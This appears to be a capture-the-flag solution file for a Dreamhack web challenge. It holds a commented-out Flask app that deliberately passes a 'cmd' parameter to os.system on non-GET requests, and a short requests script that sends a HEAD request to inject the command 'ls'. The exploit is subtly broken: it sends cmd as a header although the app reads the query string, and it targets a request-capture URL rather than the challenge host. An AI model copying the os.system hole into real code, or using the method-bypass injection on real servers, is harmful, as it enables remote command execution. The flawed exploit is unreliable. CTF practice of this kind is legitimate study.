# app.py
# #!/usr/bin/env python3
# from flask import Flask, request
# import os

# app = Flask(__name__)

# @app.route('/' , methods=['GET'])
# def index():
#     cmd = request.args.get('cmd', '')
#     if not cmd:
#         return "?cmd=[cmd]"

#     if request.method == 'GET':
#         ''
#     else:
#         os.system(cmd)
#     return cmd

# app.run(host='0.0.0.0', port=8000)


# Exploit code
import requests

PORT = 21077
# HOST = f'http://host3.dreamhack.games:{PORT}'
HOST = 'https://payeuwa.request.dreamhack.games'

headers = {
    'cmd': 'ls'
}

response = requests.head(HOST, headers=headers)

print(response.text)